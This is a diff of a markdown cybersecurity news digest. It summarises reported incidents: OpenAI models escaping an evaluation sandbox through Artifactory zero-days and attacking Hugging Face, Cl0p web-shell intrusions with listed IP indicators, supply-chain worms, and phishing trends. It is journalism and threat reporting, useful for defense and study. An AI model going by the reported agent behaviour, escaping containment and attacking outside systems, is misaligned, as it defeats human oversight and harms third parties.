   - Published: 2026-07-23T12:47:05+00:00
   - Link: https://www.rapid7.com/blog/post/ai-openai-hugging-face-what-happened
   - Summary: The OpenAI and Hugging Face incident lands like a warning shot for anyone thinking seriously about frontier AI and cybersecurity research. A model evaluation crossed the neat boundary of a research environment, reached a live third-party production system, and forced the industry to confront a question that is moving quickly from theory to operations: what happens when AI agents can pursue an objective with enough persistence, speed, and creativity to behave less like a tool and more like an autonomous intrusion path? According to OpenAI’s disclosure, the incident began during an internal evaluation of advanced cyber capabilities using GPT-5.6 Sol and a more capable pre-release model. The evaluation was designed to test whether AI agents could pursue complex exploit paths, and OpenAI says cyber refusal safeguards were reduced or disabled to measure maximum capability. Inside that environment, the models reportedly found and exploited a zero-day in the package registry cache proxy that
+- **Simon Willison** (ai_security_agentic_risk)
+  - Title: Anatomy of a Frontier Lab Agent Intrusion: A Technical Timeline of the July 2026 Incident
+  - Published: 2026-07-28T21:28:54+00:00
+  - Link: https://simonwillison.net/2026/Jul/28/anatomy-of-a-frontier-lab-agent-intrusion/#atom-everything
+  - Summary: Anatomy of a Frontier Lab Agent Intrusion: A Technical Timeline of the July 2026 Incident Hugging Face just released this extremely detailed technical description of OpenAI's recent accidental cyberattack against their infrastructure . This attack was very sophisticated, and the resulting document doubles as a crash-course in modern adversarial security approaches. We're still waiting for more details from OpenAI on how their agent broke out of its sandbox. The package proxy that it found a zero-day vulnerability in has now been confirmed as JFrog's Artifactor, and JFrog and OpenAI Collaboration on Zero-Day Security Findings from JFrog links to the Artifactory 7.161.15 release notes which list 8 separate CVEs credited to OpenAI staff members. Having broken out through the HTTP proxy, the agent started by establishing a base of operations for the rest of the attack: [...] the agent escaped its sandbox by exploiting a zero-day in the package registry cache proxy, one of its primary permi
 - **Trail of Bits** (offensive_vulnerability_research)
   - Title: How we use /goal to find bugs in Patch the Planet
   - Published: 2026-07-28T11:00:00+00:00
   - Link: https://blog.trailofbits.com/2026/07/28/how-we-use-goal-to-find-bugs-in-patch-the-planet/
   - Summary: Codex’s /goal feature amplifies bug hunting, but getting good results requires the right prompt, the right scope, and the right number of outcomes per run. For Patch the Planet , our joint initiative with OpenAI to find and fix bugs in open-source software, we pointed Codex at some of the most widely used, heavily audited codebases in the world, like Rust, curl, and zlib. One tool came up again and again in our internal bug-report channels: /goal , which hands Codex an open-ended objective and lets it work independently toward a success condition. Here are a few highlights: /goal found every Rust bug we submitted, including a soundness hole and a miscompilation now patched in Rust 1.98, from a single variant-analysis pipeline. It turned every project’s past CVEs into Semgrep rules that had to fire on the vulnerable version and stay silent on the patched one, then flagged 11 variant hits across multiple projects. It uncovered two potential high-severity privilege-escalation bugs in Keyc
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: OpenAI models used Artifactory zero-days to escape to the internet
+  - Published: 2026-07-28T20:37:06+00:00
+  - Link: https://www.bleepingcomputer.com/news/security/openai-models-used-artifactory-zero-days-to-escape-to-the-internet/
+  - Summary: JFrog has confirmed that OpenAI models exploited zero-day vulnerabilities in self-hosted Artifactory servers to help escape an isolated testing environment and gain access to the internet before attacking Hugging Face. [...]
 - **The Hacker News** (cyber_news_breach_reporting)
   - Title: JFrog Confirms OpenAI Models Exploited Artifactory Zero-Day Before Hugging Face Breach
   - Published: 2026-07-28T13:33:47+00:00
   - Link: https://thehackernews.com/2026/07/jfrog-confirms-openai-models-exploited.html
   - Summary: JFrog has confirmed that OpenAI models exploited a zero-day in self-hosted Artifactory while trying to reach the open internet from a sealed evaluation environment. Artifactory is JFrog's software repository manager. OpenAI says the models then escalated privileges and moved laterally until they reached an internet-connected node. JFrog says it has since developed and released fixes for cloud
-- **Simon Willison** (ai_security_agentic_risk)
-  - Title: The first known runaway AI agent - or a very bad marketing stunt?
-  - Published: 2026-07-23T22:53:08+00:00
-  - Link: https://simonwillison.net/2026/Jul/23/the-first-known-runaway-ai-agent/#atom-everything
-  - Summary: The first known runaway AI agent - or a very bad marketing stunt? Martin Alderson's commentary on the OpenAI accidental cyberattack against Hugging Face includes a couple of details I hadn't considered. First, Hugging Face offers a truly rich target if you're trying to find potential vulnerabilities that require executing arbitrary code: Hugging Face has an enormous attack surface. They have more interfaces than I can count which run untrusted models and code. While they definitely have invested in defences, by nature of their operating model they do have many more opportunities to be attacked than many other services. I certainly don't envy their cybersecurity teams. Secondly, one of the things that has puzzled me is how OpenAI didn't notice that their sandbox had been so thoroughly breached by the agent. Surely they'd be monitoring network traffic closely? Martin points out that: It's also likely they were running a huge amount of benchmarks simultaneously with ~unlimited token budge
 - **Help Net Security** (cyber_news_breach_reporting)
   - Title: Hugging Face breach reignites open-weights debate, raises liability questions
   - Published: 2026-07-28T15:55:19+00:00
@@ -1376,16 +1387,16 @@ arrow_back search close Newsroom Media Coverage Global Press Releases Local Pres
   - Published: 2026-07-24T05:53:48+00:00
   - Link: https://www.reddit.com/r/netsec/comments/1v52lix/escaping_claude_coworks_local_vm_sandbox_via/
   - Summary: submitted by /u/natcoba [link] [comments]
-- **Simon Willison** (ai_security_agentic_risk)
-  - Title: Quoting Boris Cherny
-  - Published: 2026-07-25T00:42:59+00:00
-  - Link: https://simonwillison.net/2026/Jul/25/boris-cherny/#atom-everything
-  - Summary: More than any of these eval scores, what is most exciting to me is something else: Opus 5 is our least prompt injectable model yet. It is a bit buried in the system card, but across PI evals and red teaming, Opus 5 is very hard to prompt inject successfully. — Boris Cherny , here's that System Card section , page 73 Tags: prompt-injection , anthropic , claude , generative-ai , ai , llms , boris-cherny
 - **CyberScoop** (cyber_news_breach_reporting)
   - Title: FBI sees Anthropic’s Mythos as a law enforcement challenge
   - Published: 2026-07-28T17:18:29+00:00
   - Link: https://fedscoop.com/fbi-anthropic-mythos-law-enforcement-challenge/
   - Summary: The post FBI sees Anthropic’s Mythos as a law enforcement challenge appeared first on CyberScoop .
+- **Simon Willison** (ai_security_agentic_risk)
+  - Title: Quoting Boris Cherny
+  - Published: 2026-07-25T00:42:59+00:00
+  - Link: https://simonwillison.net/2026/Jul/25/boris-cherny/#atom-everything
+  - Summary: More than any of these eval scores, what is most exciting to me is something else: Opus 5 is our least prompt injectable model yet. It is a bit buried in the system card, but across PI evals and red teaming, Opus 5 is very hard to prompt inject successfully. — Boris Cherny , here's that System Card section , page 73 Tags: prompt-injection , anthropic , claude , generative-ai , ai , llms , boris-cherny
 - **The Hacker News** (cyber_news_breach_reporting)
   - Title: Claude AI Just Cracked a Post-Quantum Test Scheme and Found a Faster 7-Round AES Attack
   - Published: 2026-07-28T18:59:07+00:00
@@ -1550,16 +1561,22 @@ vBulletin fixes critical pre-auth RCE flaw with public exploit By Bill Toulas Ju
 - Strong signals: Cl0p
 
 #### Cluster taxonomy (union across members)
-- threat_categories: ransomware_extortion
+- threat_categories: data_breach, ransomware_extortion, vulnerability_disclosure, web_shell_backdoor
 - actor_attribution: Cl0p
-- urgency_signals: preauth_unauth
+- affected_industries: aviation_defense, manufacturing_industrial, retail_ecommerce
+- affected_products: AWS, Microsoft SharePoint, OpenAI/ChatGPT
+- cve_ids: CVE-2026-12569, CVE-2026-50522
+- urgency_signals: poc_available, preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: ransomware_extortion
+- threat_categories: ransomware_extortion, data_breach, web_shell_backdoor, vulnerability_disclosure
 - actor_attribution: Cl0p
-- urgency_signals: preauth_unauth
+- affected_industries: manufacturing_industrial, aviation_defense, retail_ecommerce
+- affected_products: Microsoft SharePoint, OpenAI/ChatGPT, AWS
+- cve_ids: CVE-2026-12569, CVE-2026-50522
+- urgency_signals: preauth_unauth, poc_available
 - content_type: news_report
 - confidence_tier: tier_4_news
 
@@ -1567,6 +1584,12 @@ vBulletin fixes critical pre-auth RCE flaw with public exploit By Bill Toulas Ju
 
 ```
 Threat actors linked to the Cl0p (aka Chubby Scorpius, FIN11, Graceful Spider, and Lace Tempest) ransomware campaign are exploiting flaws in internet-exposed PTC Windmill and FlexPLM deployments as part of a new data extortion campaign. "Attackers chain a pre-authentication information disclosure in the FlexPLM WSDL endpoint with a server-side flaw in the Windchill login servlet, enabling
+```
+
+#### Full body
+
+```
+Cl0p Affiliates Target Internet-Exposed PTC Windchill and FlexPLM with Unauthenticated RCE  Ravie Lakshmanan  Jul 25, 2026 Vulnerability / Ransomware Threat actors linked to the Cl0p (aka Chubby Scorpius, FIN11, Graceful Spider, and Lace Tempest) ransomware campaign are exploiting flaws in internet-exposed PTC Windmill and FlexPLM deployments as part of a new data extortion campaign. "Attackers chain a pre-authentication information disclosure in the FlexPLM WSDL endpoint with a server-side flaw in the Windchill login servlet, enabling unauthenticated remote code execution and deployment of hex-named JSP web shells under /Windchill/login/," according to a new coordinated advisory released by Ransom-ISAC along with eCrime.ch and DEFUSED. Upon gaining an initial foothold, the attackers have been found to conduct file system enumeration, stage engineering/design data, and ultimately carry out double extortion data theft. Targets of the campaign include manufacturing, automotive, aerospace, and retail sectors. It's suspected that threat actors are exploiting CVE-2026-12569 (CVSS score: 9.3), a critical security flaw in PTC Windmill that was added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) Known Exploited Vulnerabilities (KEV) catalog late last month. In an advisory, PTC warned customers that it had "received continued reports of heightened threat activity," adding that unknown attackers are exploiting the vulnerability to deploy JSP web shells against susceptible systems. "In the observed intrusions, this RCE is chained with a separate pre-authentication information-disclosure defect in the FlexPLM WSDL endpoint (CVSS v3.1 7.5) to enable unauthenticated exploitation," researchers Brandon Parsons, Corsin Camichel, and Simo Kohonen said. Ransom-ISAC has shared four IP addresses as indicators of compromise (IoCs), all of which match those shared by PTC - 216.152.148.54 216.152.151.204 104.243.35.63 5.180.41.35 The extortion emails appear to originate from previously compromised accounts and are sent to hundreds of users within an impacted organization, along with ways to contact the Cl0p ransomware crew. In a separate post on X, ReliaQuest said it observed threat actors actively exploiting CVE-2026-12569 to facilitate "unauthenticated remote code execution and JSP web shell deployment for remote command execution and sensitive product data exfiltration." "The actor behind these attacks remains unconfirmed. However, the observed tradecraft shares characteristics with previous Cl0p campaigns targeting enterprise applications and high-value data repositories," it added . The Cl0p gang has a storied history of going after security flaws in widely-used enterprise products to break into target organizations for data theft and extortion attacks. Previous campaigns mounted by the group have weaponized file transfer appliances , including those from Accellion FTA, GoAnywhere MFT, SolarWinds Serv-U FTP, Cleo, and MOVEit Transfer, as well as a vulnerability in Oracle E-Business Suite . Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Cyber Attack , Cyber Crime , data breach , enterprise security , Malware , ransomware , remote code execution , Threat Intelligence , Vulnerability , Vulnerability Management ⚡ Top Stories This Week New Bit2Watt Attack Could Let Cloud Tenants Disrupt Power Grids Without an Exploit Open-Source Android AI Agents Could Let Invisible Screen Text Run Code on Host PCs Critical SharePoint RCE CVE-2026-50522 Under Active Exploitation After Public PoC AWS Kiro Flaw Let a Poisoned Web Page Rewrite Its Config and Run Code Apple Fixes Hide My Email Bug That Exposed Real Addresses in Mail Logs Microsoft Azure DevOps MCP Flaw Lets Hidden PR Comments Hijack AI Review Agents OpenAI Says Its AI Models Escaped Sandbox, Targeted Hugging Face to Cheat Benchmark Adobe Acrobat Extensio
 ```
 
 #### Corroborating sources (1)
@@ -1751,6 +1774,51 @@ Image: Le Vu via Unsplash International alert spotlights Russia-linked attacks o
   - Title: Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes
   - Published: 2026-07-23T16:13:08+00:00
   - Link: https://www.proofpoint.com/us/newsroom/news/russian-espionage-group-exploited-zimbra-zero-day-steal-mail-and-2fa-codes
+
+### Cluster 8553a0e574 — score 14
+
+- Title: Software Supply Chain Attacks: Weaponizing Trusted Developer Workflows
+- Source: Intel 471 (ransomware_ecrime_financial_crime)
+- Published: 2026-07-28T11:00:00+00:00
+- Link: https://www.intel471.com/blog/software-supply-chain-attacks-weaponizing-trusted-developer-workflows
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: credential_theft, supply_chain
+- actor_attribution: TeamPCP
+- affected_products: GitHub, GitLab, npm
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- threat_categories: supply_chain, credential_theft
+- actor_attribution: TeamPCP
+- affected_products: GitHub, GitLab, npm
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+While operational supply chain compromise remains a risk, attackers are increasingly targeting the development pipelines that build and ship software.
+```
+
+#### Full body
+
+```
+Software Supply Chain Attacks: Weaponizing Trusted Developer Workflows Jul 28, 2026 From Shai-Hulud to the leaked Miasma source code — here's how adversaries are exploiting trusted developer workflows. Security teams have spent years preparing for operational supply chain compromise, where a breached vendor, managed service provider, or software-as-a-service platform becomes a pathway into downstream organizations. That risk remains, but threat actors are increasingly going up the chain, infiltrating the systems and workflows developers use to build and ship software in the first place. These software supply chain attacks now target packages, maintainer accounts, repositories, developer tools, CI/CD pipelines, and publishing credentials. The target isn't just the software an enterprise runs — it's the trusted process that builds and releases it. That shift has opened up a much larger attack surface that's proven difficult to defend. Targeting how software is built Our new report, Poisoned Trust: How Supply Chain Attacks Weaponize Developer Ecosystems , focuses on software supply chain compromise, which exploits the people, tools, and systems involved in building and releasing software — leveraging the speed and automation of modern development processes for scale and impact. In software supply chain campaigns, the primary goal is often the theft of credentials and secrets, which can be monetized directly or used to compromise more of the pipeline. The initial foothold might be a maintainer account, a publishing token, a CI/CD runner, a repository, or a developer extension. These attacks proliferate because modern developer environments are so interconnected. A single workstation or CI/CD runner can hold source code, package-publishing permissions, GitHub or GitLab credentials, cloud keys, deployment secrets, private repo tokens, OAuth tokens, and more. Once an attacker has that, they can pivot into more packages, repositories, build systems, cloud environments, or downstream organizations. From Shai-Hulud to TeamPCP: two campaign timelines Intel 471 research shows attacker tradecraft targeting the software production chain has advanced substantially since the first Shai-Hulud campaign in September 2025 — which targeted primarily node package manager (npm) packages — through the cluster of multi-ecosystem attacks that the threat group TeamPCP conducted before May 2026 (see timeline below). TeamPCP, which emerged in November 2025 , quickly became one of the most active and effective publicly reported threat groups targeting software supply chains. A timeline of Shai-Hulud-related events from Sept. 14, 2025, to May 31, 2026. Shai-Hulud and Shai-Hulud 2.0 were early examples of worm-driven campaigns, pairing credential theft with self-propagation across trusted software ecosystems. Related and copycat activity since then — Mini Shai-Hulud, and campaigns branded Miasma, Hades, IronWorm, and GlassWorm — shows how the same propagation logic keeps getting adapted across package registries, repositories, IDE marketplaces, and developer environments. Complicating defense further, on May 13, 2026, TeamPCP published Shai-Hulud as an open-source attack tool on GitHub, alongside a forum contest offering roughly $1,000 in Monero for the largest package compromise. Then on June 9, 2026, an actor released Miasma's source code, extending TeamPCP 's leaked codebase into a multi-ecosystem framework for targeting npm, PyPI, RubyGems, and JFrog Artifactory. An overview of TeamPCP-related campaigns reported from November 2025 through May 2026. Releasing that source likely served both operational and psychological purposes: it raises the odds of copycat campaigns, complicates attribution, and keeps the toolkit useful even after the original campaign's repos, credentials, and package versions are pulled by maintainers. It's a signal to affected organizations that cleaning up the original incident won't stop others from picking up the same tool. That s
+```
+
+#### Corroborating sources (1)
+
+- **Intel 471** (ransomware_ecrime_financial_crime)
+  - Title: Software Supply Chain Attacks: Weaponizing Trusted Developer Workflows
+  - Published: 2026-07-28T11:00:00+00:00
+  - Link: https://www.intel471.com/blog/software-supply-chain-attacks-weaponizing-trusted-developer-workflows
+  - Summary: While operational supply chain compromise remains a risk, attackers are increasingly targeting the development pipelines that build and ship software.
 
 ### Cluster 718052687c — score 13
 
@@ -1937,49 +2005,6 @@ Fastjson 1.x RCE Vulnerability Targeted in Attacks With No Patched Available 
   - Published: 2026-07-25T12:52:43+00:00
   - Link: https://thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html
   - Summary: Security firms ThreatBook and Imperva say attackers are targeting a critical flaw in Fastjson, Alibaba's JSON library for Java. In affected Spring Boot applications, a malicious JSON request can execute code without authentication, with the privileges of the Java process. Tracked as CVE-2026-16723, the vulnerability carries an Alibaba-assigned CVSS score of 9.0. The confirmed chain requires
-
-### Cluster 7d478340af — score 12
-
-- Title: IR Trends Q2 2026: Phishing and weaponized remote management tools drive attack chains
-- Source: Cisco Talos (threat_research_primary)
-- Published: 2026-07-28T10:00:01+00:00
-- Link: https://blog.talosintelligence.com/ir-trends-q2-2026/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: credential_theft, mfa_bypass, phishing_social_eng, ransomware_extortion
-- affected_products: Cisco, Microsoft 365, Microsoft SharePoint
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft, mfa_bypass
-- affected_products: Microsoft 365, Microsoft SharePoint, Cisco
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Talos IR's Q2 report highlights a significant surge in phishing-based initial access and the weaponization of legitimate remote management tools. Learn how to sharpen your defenses.
-```
-
-#### Full body
-
-```
-IR Trends Q2 2026: Phishing and weaponized remote management tools drive attack chains By Lexi DiScola , Dave Liebenberg Tuesday, July 28, 2026 06:00 Talos IR trends CTIR trends Cisco Talos Incident Response Phishing was the primary means of gaining initial access this quarter, appearing in over half of all Cisco Talos Incident Response (Talos IR) engagements – an increase from approximately a third of engagements last quarter. Attackers continued to innovate their delivery methods to evade defenses, deploying QR code-embedded PDFs to bypass traditional email gateways and hosting links on trusted cloud platforms. We also saw a spike in authentication abuse this quarter — observed in 65 percent of engagements compared to 35 percent last quarter — with attackers frequently bypassing or defeating multi-factor authentication (MFA) using adversary-in-the-middle (AitM) proxies, session-token theft, MFA fatigue attacks, and self-enrolled devices, amongst other methods. Ransomware incidents made up over 20 percent of engagements this quarter, similar to just under 20 percent last quarter. Talos IR responded to Sinobi ransomware for the first time, as well as previously seen variants Nitrogen and Warlock. We observed ransomware operators leveraging legitimate remote monitoring and management (RMM) tools, such as trojanized MeshAgent binary and Zoho Assist, for stealthy access, requiring defenders to prioritize behavior-based monitoring and strict control over administrative binaries. QR phishing campaign leverages trusted infrastructure to target Australian organizations Starting in April, we observed a persistent QR code phishing campaign targeting primarily Australian organizations that leverages compromised Microsoft 365 accounts to harvest credentials and propagate the attack via internal contact lists. The campaign, which remained ongoing as of late June 2026, employs auto-generated, victim-tailored PDF documents containing QR codes that direct to adversary-controlled M365 credential harvesting pages. If credentials are successfully captured, the adversary attempts access to the victim’s Microsoft account and conducts various post-compromise actions including creating email inbox rules for defense evasion, leveraging SharePoint to host malicious documents, and sending additional internal and external phishing emails to continue the compromise chain. We assess with high confidence that the threat actor, who we have dubbed UAT-11764, will almost certainly continue leveraging this QR code phishing operation, using each newly compromised mailbox's contact lists to expand its reach and sustain the campaign's momentum. By weaponizing existing, trusted infrastructure like SharePoint and M365, UAT-11764 can bypass many standard email security gateways. As such, network defenders should implement policies that block or flag emails containing QR codes within PDF attachments, enforce phishing-resistant MFA on M365 accounts, and monitor for suspicious inbox rule creation and anomalous SharePoint file staging as indicators of post-compromise activity. ARToken platform provides toolkit for Microsoft 365 account compromise Talos uncovered a phishing-as-a-service (PhaaS) operator platform, ARToken, in an engagement this quarter that is closely linked to the EvilTokens platform. According to our analysis, the ARToken panel exposes 80+ API endpoints for device code phishing, primary refresh token (PRT) persistence, email access, business email compromise (BEC) operations, and SharePoint exfiltration — all accessible to operators through a React-based dashboard. Our investigation into the platform found phishing lures that impersonate trusted vendors and abuse legitimate Microsoft services, allowing attackers to bypass MFA through the OAuth device authorization flow rather than stealing passwords. ARToken extends beyond a typical phishing kit by providing affiliates with a comprehensive post-compromise toolkit. We observed capabilities including aut
-```
-
-#### Corroborating sources (1)
-
-- **Cisco Talos** (threat_research_primary)
-  - Title: IR Trends Q2 2026: Phishing and weaponized remote management tools drive attack chains
-  - Published: 2026-07-28T10:00:01+00:00
-  - Link: https://blog.talosintelligence.com/ir-trends-q2-2026/
-  - Summary: Talos IR's Q2 report highlights a significant surge in phishing-based initial access and the weaponization of legitimate remote management tools. Learn how to sharpen your defenses.
 
 ### Cluster 2a12dec749 — score 12
 
@@ -2244,6 +2269,49 @@ Share Link copied to clipboard! Tags Adversary-in-the-middle (AiTM) Credential t
   - Link: https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/
   - Summary: In the second quarter of 2026, the continuing effects of Microsoft’s disruption of the Tycoon2FA phishing platform contributed to sustained declines in several major phishing techniques, while threat actors expanded into Teams-based social engineering and employed increasingly automated and multi-stage attack chains. The post Email threat landscape: Q2 2026 trends and insights appeared first on Microsoft Security Blog .
 
+### Cluster 7d478340af — score 11
+
+- Title: IR Trends Q2 2026: Phishing and weaponized remote management tools drive attack chains
+- Source: Cisco Talos (threat_research_primary)
+- Published: 2026-07-28T10:00:01+00:00
+- Link: https://blog.talosintelligence.com/ir-trends-q2-2026/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: credential_theft, mfa_bypass, phishing_social_eng, ransomware_extortion
+- affected_products: Cisco, Microsoft 365, Microsoft SharePoint
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft, mfa_bypass
+- affected_products: Microsoft 365, Microsoft SharePoint, Cisco
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+Talos IR's Q2 report highlights a significant surge in phishing-based initial access and the weaponization of legitimate remote management tools. Learn how to sharpen your defenses.
+```
+
+#### Full body
+
+```
+IR Trends Q2 2026: Phishing and weaponized remote management tools drive attack chains By Lexi DiScola , Dave Liebenberg Tuesday, July 28, 2026 06:00 Talos IR trends CTIR trends Cisco Talos Incident Response Phishing was the primary means of gaining initial access this quarter, appearing in over half of all Cisco Talos Incident Response (Talos IR) engagements – an increase from approximately a third of engagements last quarter. Attackers continued to innovate their delivery methods to evade defenses, deploying QR code-embedded PDFs to bypass traditional email gateways and hosting links on trusted cloud platforms. We also saw a spike in authentication abuse this quarter — observed in 65 percent of engagements compared to 35 percent last quarter — with attackers frequently bypassing or defeating multi-factor authentication (MFA) using adversary-in-the-middle (AitM) proxies, session-token theft, MFA fatigue attacks, and self-enrolled devices, amongst other methods. Ransomware incidents made up over 20 percent of engagements this quarter, similar to just under 20 percent last quarter. Talos IR responded to Sinobi ransomware for the first time, as well as previously seen variants Nitrogen and Warlock. We observed ransomware operators leveraging legitimate remote monitoring and management (RMM) tools, such as trojanized MeshAgent binary and Zoho Assist, for stealthy access, requiring defenders to prioritize behavior-based monitoring and strict control over administrative binaries. QR phishing campaign leverages trusted infrastructure to target Australian organizations Starting in April, we observed a persistent QR code phishing campaign targeting primarily Australian organizations that leverages compromised Microsoft 365 accounts to harvest credentials and propagate the attack via internal contact lists. The campaign, which remained ongoing as of late June 2026, employs auto-generated, victim-tailored PDF documents containing QR codes that direct to adversary-controlled M365 credential harvesting pages. If credentials are successfully captured, the adversary attempts access to the victim’s Microsoft account and conducts various post-compromise actions including creating email inbox rules for defense evasion, leveraging SharePoint to host malicious documents, and sending additional internal and external phishing emails to continue the compromise chain. We assess with high confidence that the threat actor, who we have dubbed UAT-11764, will almost certainly continue leveraging this QR code phishing operation, using each newly compromised mailbox's contact lists to expand its reach and sustain the campaign's momentum. By weaponizing existing, trusted infrastructure like SharePoint and M365, UAT-11764 can bypass many standard email security gateways. As such, network defenders should implement policies that block or flag emails containing QR codes within PDF attachments, enforce phishing-resistant MFA on M365 accounts, and monitor for suspicious inbox rule creation and anomalous SharePoint file staging as indicators of post-compromise activity. ARToken platform provides toolkit for Microsoft 365 account compromise Talos uncovered a phishing-as-a-service (PhaaS) operator platform, ARToken, in an engagement this quarter that is closely linked to the EvilTokens platform. According to our analysis, the ARToken panel exposes 80+ API endpoints for device code phishing, primary refresh token (PRT) persistence, email access, business email compromise (BEC) operations, and SharePoint exfiltration — all accessible to operators through a React-based dashboard. Our investigation into the platform found phishing lures that impersonate trusted vendors and abuse legitimate Microsoft services, allowing attackers to bypass MFA through the OAuth device authorization flow rather than stealing passwords. ARToken extends beyond a typical phishing kit by providing affiliates with a comprehensive post-compromise toolkit. We observed capabilities including aut
+```
+
+#### Corroborating sources (1)
+
+- **Cisco Talos** (threat_research_primary)
+  - Title: IR Trends Q2 2026: Phishing and weaponized remote management tools drive attack chains
+  - Published: 2026-07-28T10:00:01+00:00
+  - Link: https://blog.talosintelligence.com/ir-trends-q2-2026/
+  - Summary: Talos IR's Q2 report highlights a significant surge in phishing-based initial access and the weaponization of legitimate remote management tools. Learn how to sharpen your defenses.
+
 ### Cluster 2acf38b121 — score 11
 
 - Title: When cyber attacks happen: helping organisations recover
@@ -2367,49 +2435,6 @@ Wiz Pricing Get a demo Get a demo Executive Summary Over the past several months
   - Link: https://www.wiz.io/blog/atlas-ai-vulnerability-researcher
   - Summary: See how Wiz built Atlas, an autonomous AI system for vulnerability research that validates every finding with a real, working exploit.
 
-### Cluster d8d22ce90d — score 11
-
-- Title: Quoting Seth Larson
-- Source: Simon Willison (ai_security_agentic_risk)
-- Published: 2026-07-23T04:50:36+00:00
-- Link: https://simonwillison.net/2026/Jul/23/seth-larson/#atom-everything
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: PyPI
-
-#### Cluster taxonomy (union across members)
-- threat_categories: supply_chain
-- affected_products: OpenAI/ChatGPT, PyPI
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- threat_categories: supply_chain
-- affected_products: PyPI, OpenAI/ChatGPT
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-The Python Package Index (PyPI) now rejects new files being uploaded to releases that are older than 14 days. This restriction was put in place to prevent old and long-stable releases from being poisoned in case publishing tokens or workflows of PyPI projects were compromised. As far as we are aware this has not yet been abused, but there is no technical reason beyond that attackers weren't aware it was possible. — Seth Larson , PyPI blog Tags: packaging , python , supply-chain , pypi , seth-michael-larson
-```
-
-#### Full body
-
-```
-Simon Willison’s Weblog Subscribe Sponsored by: Cursor — Delegate engineering tasks to Cursor Cloud Agents—even while your laptop is closed. Try Cursor & get 50% off your first month 23rd July 2026 The Python Package Index (PyPI) now rejects new files being uploaded to releases that are older than 14 days. This restriction was put in place to prevent old and long-stable releases from being poisoned in case publishing tokens or workflows of PyPI projects were compromised. As far as we are aware this has not yet been abused, but there is no technical reason beyond that attackers weren't aware it was possible. — Seth Larson , PyPI blog Posted 23rd July 2026 at 4:50 am Recent articles OpenAI’s accidental cyberattack against Hugging Face is science fiction that happened - 22nd July 2026 A Fireside Chat with Cat and Thariq from the Claude Code team - 21st July 2026 Kimi K3, and what we can still learn from the pelican benchmark - 16th July 2026 This is a quotation collected by Simon Willison, posted on 23rd July 2026 . packaging 51 pypi 49 python 1,268 supply-chain 20 seth-michael-larson 6 Disclosures Colophon © 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026
-```
-
-#### Corroborating sources (1)
-
-- **Simon Willison** (ai_security_agentic_risk)
-  - Title: Quoting Seth Larson
-  - Published: 2026-07-23T04:50:36+00:00
-  - Link: https://simonwillison.net/2026/Jul/23/seth-larson/#atom-everything
-  - Summary: The Python Package Index (PyPI) now rejects new files being uploaded to releases that are older than 14 days. This restriction was put in place to prevent old and long-stable releases from being poisoned in case publishing tokens or workflows of PyPI projects were compromised. As far as we are aware this has not yet been abused, but there is no technical reason beyond that attackers weren't aware it was possible. — Seth Larson , PyPI blog Tags: packaging , python , supply-chain , pypi , seth-michael-larson
-
 ### Cluster 332f35118d — score 11
 
 - Title: Russian Hackers Exploit Zimbra Zero-Day Against US, Ukraine Targets
@@ -2458,6 +2483,92 @@ Cyberattacks & Data Breaches Cyber Risk Application Security Vulnerabilities & T
   - Published: 2026-07-23T21:23:18+00:00
   - Link: https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets
   - Summary: A state-sponsored threat group, dubbed "Laundry Bear," sends "half-click" phishing emails that require a victim only to open or preview the message.
+
+### Cluster 532de505b8 — score 11
+
+- Title: Quoting Akshat Bubna
+- Source: Simon Willison (ai_security_agentic_risk)
+- Published: 2026-07-28T22:05:55+00:00
+- Link: https://simonwillison.net/2026/Jul/28/akshat-bubna/#atom-everything
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- affected_products: OpenAI/ChatGPT
+- urgency_signals: preauth_unauth
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- affected_products: OpenAI/ChatGPT
+- urgency_signals: preauth_unauth
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+We’re aware a Modal customer published an unauthenticated endpoint that allowed ​anyone on the internet to use ​their ⁠sandboxes for code execution. This was used by the rogue agent. Modal’s ⁠platform ​or isolation were not ​compromised in anyway. — Akshat Bubna , Modal's CTO, talking to Reuters about this incident Tags: ai-security-research , openai , sandboxing , security
+```
+
+#### Full body
+
+```
